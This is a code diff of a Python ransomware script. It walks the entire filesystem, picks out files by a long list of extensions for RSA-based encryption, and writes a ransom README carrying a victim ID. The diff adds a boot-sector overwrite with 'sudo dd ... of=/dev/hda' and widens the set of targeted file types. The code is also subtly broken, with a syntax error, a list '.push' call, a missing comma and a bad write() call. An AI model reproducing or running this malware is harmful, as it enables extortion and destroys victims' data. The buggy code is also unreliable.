@@ -14,6 +14,12 @@ ID = ''
 key = RSA.generate(2048)
 exKey = RSA.exportKey('PEM')
 
+if sys.platform == 'linux2'':
+	try:
+		os.system("sudo dd if=boot.bin of=/dev/hda bs=512 count=1")
+	except:
+		pass
+
 def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
 	global ID
 	ID = ''.join(random.choice(chars) for _ in range(size))
@@ -72,10 +78,17 @@ def single_arg_encrypt_file(in_filename):
     encrypt_file(key, in_filename)
 
 def selectfiles():
+    
+    ext = [".3g2", ".3gp", ".asf", ".asx", ".avi", ".flv", 
+           ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
+           ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
+           ".jpg",".jpeg",".png", ".tiff", ".zip", ".7z", ".exe", 
+           ".tar.gz", "tar", ".mp3", ".sh", ".c", ".h", ".txt"]
+           
     files_to_enc = []
     for root, dirs, files in os.walk("/"):
         for file in files:
-            if file.endswith(".docx",".pdf",".rar",".jpg",".jpeg",".png",".tiff",".zip",".7z",".exe",".mp3",""):
+            if file.endswith(tuple(ext)):
                 files_to_enc.push(os.path.join(root, file))
 
     pool = Pool(processes=4)
@@ -94,9 +107,9 @@ def note():
 	888    888 888  888 888  888 888  888 88888888 888     
 	Y88b  d88P Y88b 888 888 d88P 888  888 Y8b.     888     
 	"Y8888P"   "Y88888 88888P"  888  888  "Y8888  888     
-                888 888                                
-           Y8b d88P 888                                
-            "Y88P"  888     
+        	        888 888                                
+        	 Y8b d88P 888                                
+        	 "Y88P"  888     
 	
 	
 	
@@ -114,7 +127,7 @@ def note():
 	outfile = outdir + "README"
 	
 	handler = open(outputfile, 'w')
-	handler.write(outfile)
+	handler.write(outfile, ID)
 	handler.close()
 	
 if __name__=="__main__":
@@ -123,8 +136,6 @@ if __name__=="__main__":
 	
 	try:
 		selectfiles()
-	except exception as e:
+		note()
+	except Exception as e:
 		pass
-	
-		
-
